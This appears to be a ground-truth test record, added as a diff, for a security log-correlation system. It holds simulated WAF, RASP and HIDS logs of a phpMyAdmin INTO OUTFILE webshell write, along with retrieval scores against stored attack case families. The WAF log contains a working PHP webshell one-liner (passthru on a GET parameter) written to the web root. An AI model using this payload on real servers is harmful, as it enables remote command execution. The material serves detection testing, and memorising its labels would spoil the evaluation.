@@ -1,0 +1,140 @@
+{
+ "unit": 1057,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "数据库 Web 管理台写 webshell（phpMyAdmin INTO OUTFILE）",
+ "sources": [
+  "waf",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-15 02:44:02",
+   "source": "waf",
+   "log_id": "WAF0297707",
+   "content": "/phpmyadmin/import.php sql=SELECT \"<?php passthru($_GET[c]);?>\" INTO OUTFILE \"/var/www/x.php\" Mozilla/5.0 (Win",
+   "event_id": "1057-WAF0297707"
+  },
+  {
+   "timestamp": "2026-06-15 02:44:03",
+   "source": "rasp",
+   "log_id": "RASP0329377",
+   "content": "https://app-php-66.ops-corp.com/phpmyadmin/import.php {\"sql_write\": \"INTO OUTFILE /var/www/x.php\", \"webshell\":",
+   "event_id": "1057-RASP0329377"
+  },
+  {
+   "timestamp": "2026-06-15 02:45:04",
+   "source": "hids",
+   "log_id": "HID0322629",
+   "content": "chmod 755 /var/www/x.php /bin/chmod chmod 755 /var/www/x.php <== /bin/sh -c 'chmod 755' <== php-fpm: pool www",
+   "event_id": "1057-HID0322629"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-004",
+   "name": "Laravel Ignition 反序列化 RCE + cron 持久化",
+   "summary": "请求 _ignition/execute-solution 触发 phar 反序列化 → 应用侧记录 phar:// 载荷 → PHP-FPM 派生子 shell 执行 id → 追加 crontab 定时回连。",
+   "matched_steps": 0,
+   "total_steps": 4,
+   "shape": "none",
+   "longest_run": 0,
+   "tier": "keyword_only",
+   "order_ok": false,
+   "order_assessable": false,
+   "source_fit_ratio": 0.0,
+   "evidence": [],
+   "source_mismatches": [],
+   "keyword_score": 3,
+   "keyword_details": [
+    "keyword +3: php-fpm"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1053.003"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3",
+    "S4"
+   ],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  },
+  {
+   "case_id": "CASE-008",
+   "name": "Exchange ProxyLogon 风格利用链",
+   "summary": "SSRF 入口 → IIS 进程执行 → ASPX webshell → PrintSpoofer 提权 → 服务持久化 → DNS TXT 外传。",
+   "matched_steps": 0,
+   "total_steps": 6,
+   "shape": "none",
+   "longest_run": 0,
+   "tier": "keyword_only",
+   "order_ok": false,
+   "order_assessable": false,
+   "source_fit_ratio": 0.0,
+   "evidence": [],
+   "source_mismatches": [],
+   "keyword_score": 3,
+   "keyword_details": [
+    "keyword +3: webshell"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.003",
+    "T1505.003",
+    "T1068",
+    "T1543.003",
+    "T1048.003"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3",
+    "S4",
+    "S5",
+    "S6"
+   ],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "keyword_only",
+  "shape": "none",
+  "matched_steps": 0,
+  "total_steps": 4,
+  "order_ok": false,
+  "order_assessable": false,
+  "source_fit_ratio": 0.0,
+  "steps": [],
+  "unobserved_steps": [
+   "S1",
+   "S2",
+   "S3",
+   "S4"
+  ],
+  "gap_steps": [],
+  "before_steps": [],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 3,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1053.003"
+  ]
+ }
+}
